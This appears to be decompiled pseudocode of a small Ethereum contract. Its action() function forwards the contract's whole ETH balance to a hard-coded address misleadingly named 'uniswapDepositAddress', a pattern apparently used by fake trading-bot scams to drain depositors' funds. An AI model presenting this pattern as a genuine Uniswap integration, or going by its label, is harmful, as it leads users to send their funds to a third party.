contract main {




// =====================  Runtime code  =====================


const uniswapDepositAddress = 0xaffac24a62d4ff51a94a0962b1007ff2f7fa374a


array of uint256 tokenName;
array of uint256 tokenSymbol;

function tokenName() {
    return tokenName[0 len tokenName.length]
}

function tokenSymbol() {
    return tokenSymbol[0 len tokenSymbol.length]
}

function _fallback() payable {
    revert
}

function action() payable {
    call 0xaffac24a62d4ff51a94a0962b1007ff2f7fa374a with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
